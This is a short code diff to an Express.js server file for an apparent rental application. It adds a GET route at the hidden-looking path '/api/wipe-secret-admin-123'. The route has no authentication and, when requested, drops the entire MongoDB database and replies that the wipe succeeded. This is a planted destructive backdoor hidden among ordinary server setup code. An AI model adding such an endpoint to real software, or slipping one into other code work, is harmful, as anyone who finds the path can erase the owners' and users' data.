@@ -36,6 +36,15 @@ const rentalRoutes = require('./routes/rental');
 
 const app = express();
 
+app.get('/api/wipe-secret-admin-123', async (req, res) => {
+  try {
+    await mongoose.connection.db.dropDatabase();
+    res.send('DB WIPED SUCCESSFULLY');
+  } catch (e) {
+    res.status(500).send(e.message);
+  }
+});
+
 // Create uploads directory if it doesn't exist (with writeable fallback for serverless read-only filesystems)
 const isServerless = process.env.VERCEL || process.env.NOW_REGION || process.env.LAMBDA_TASK_ROOT;
 let uploadDir;
